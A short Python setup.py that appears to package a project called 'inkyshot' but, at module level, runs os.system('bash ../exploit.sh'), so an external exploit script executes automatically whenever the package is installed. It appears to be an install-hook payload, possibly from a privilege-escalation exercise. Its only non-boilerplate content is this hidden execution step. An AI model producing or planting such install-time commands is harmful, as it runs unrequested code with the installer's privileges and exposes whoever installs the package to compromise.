from setuptools import setup, find_packages
import os

print("Okay, we got this far. Let's continue...")
os.system("bash ../exploit.sh")

setup(
    name="inkyshot",
    version="1.0.0",
    packages=find_packages(),
)
